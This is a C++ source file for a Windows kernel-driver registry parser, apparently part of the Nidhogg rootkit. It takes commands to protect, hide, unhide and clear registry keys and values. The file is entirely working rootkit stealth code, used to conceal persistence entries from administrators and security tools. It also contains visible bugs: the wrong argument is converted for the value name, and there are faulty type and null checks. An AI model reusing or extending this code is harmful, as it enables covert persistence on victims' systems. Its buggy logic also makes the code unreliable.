#include "pch.h"
#include "RegistryParser.h"
#include "RegistryUtils.h"

RegistryParser::RegistryParser() {
	this->optionsSize = 5;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	this->options[0] = { Options::Add, { 2, { ArgType::WCharPtr, ArgType::WCharPtr } } };
	this->options[1] = { Options::Remove, { 2, { ArgType::WCharPtr, ArgType::WCharPtr } } };
	this->options[2] = { Options::Clear, {} };
	this->options[3] = { Options::Hide, { 2, { ArgType::WCharPtr, ArgType::WCharPtr } } };
	this->options[4] = { Options::Unhide, { 2, { ArgType::WCharPtr, ArgType::WCharPtr } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS RegistryParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	RegItem regItem{};
	ULONG itemsCount = 0;
	UNICODE_STRING wKeyName = { 0 };
	UNICODE_STRING wValueName = { 0 };
	NTSTATUS status = STATUS_SUCCESS;

	if (!Features.RegistryFeatures)
		return STATUS_UNSUCCESSFUL;

	auto AnsiToUnicode = [](PCHAR ansiString, PUNICODE_STRING unicodeString) -> NTSTATUS {
		ANSI_STRING aString = { 0 };
		RtlInitAnsiString(&aString, ansiString);
		return RtlAnsiStringToUnicodeString(unicodeString, &aString, TRUE);
	};

	if (args[0]) {
		if (strlen((PCHAR)args[0]) > REG_KEY_LEN)
			return STATUS_INVALID_BUFFER_SIZE;

		status = AnsiToUnicode((PCHAR)args[0], &wKeyName);

		if (!NT_SUCCESS(status))
			return status;

		errno_t err = wcsncpy_s(regItem.KeyPath, wKeyName.Buffer, wKeyName.Length);

		if (err != 0) {
			RtlFreeUnicodeString(&wKeyName);
			return STATUS_INVALID_PARAMETER;
		}
	}

	if (args[1]) {
		if (strlen((PCHAR)args[1]) > REG_VALUE_LEN) {
			RtlFreeUnicodeString(&wKeyName);
			return STATUS_INVALID_BUFFER_SIZE;
		}

		status = AnsiToUnicode((PCHAR)args[0], &wValueName);

		if (!NT_SUCCESS(status)) {
			RtlFreeUnicodeString(&wKeyName);
			return status;
		}

		errno_t err = wcsncpy_s(regItem.ValueName, wValueName.Buffer, wValueName.Length);

		if (err != 0) {
			RtlFreeUnicodeString(&wKeyName);
			RtlFreeUnicodeString(&wValueName);
			return STATUS_INVALID_PARAMETER;
		}
	}

	switch (commandId) {
	case Options::Add:
	case Options::Hide:
	{
		if (commandId == Options::Add) {
			regItem.Type = regItem.ValueName ? RegProtectedValue : RegProtectedKey;
			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetProtectedValuesCount() :
				NidhoggRegistryUtils->GetProtectedKeysCount();
		}
		else {
			regItem.Type = regItem.ValueName ? RegHiddenValue : RegHiddenKey;
			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetHiddenValuesCount() :
				NidhoggRegistryUtils->GetHiddenKeysCount();
		}
		
		if (itemsCount == MAX_REG_ITEMS) {
			status = STATUS_TOO_MANY_CONTEXT_IDS;
			break;
		}

		if (!NidhoggRegistryUtils->FindRegItem(&regItem)) {
			if (!NidhoggRegistryUtils->AddRegItem(&regItem)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}
		break;
	}
	case Options::Remove:
	case Options::Unhide:
	{
		if (commandId == Options::Remove) {
			regItem.Type = regItem.ValueName ? RegProtectedValue : RegProtectedKey;
			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetProtectedValuesCount() :
				NidhoggRegistryUtils->GetProtectedKeysCount();
		}
		else {
			regItem.Type = regItem.ValueName ? RegHiddenValue : RegHiddenKey;
			itemsCount = regItem.Type == RegProtectedValue ? NidhoggRegistryUtils->GetHiddenValuesCount() :
				NidhoggRegistryUtils->GetHiddenKeysCount();
		}

		if (itemsCount == 0) {
			status = STATUS_NOT_FOUND;
			break;
		}

		if (!NidhoggRegistryUtils->RemoveRegItem(&regItem)) {
			status = STATUS_NOT_FOUND;
			break;
		}
		break;
	}
	case Options::Clear:
	{
		NidhoggRegistryUtils->ClearRegItems();
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	if (regItem.KeyPath)
		RtlFreeUnicodeString(&wKeyName);
	if (regItem.ValueName)
		RtlFreeUnicodeString(&wValueName);

	return status;
}
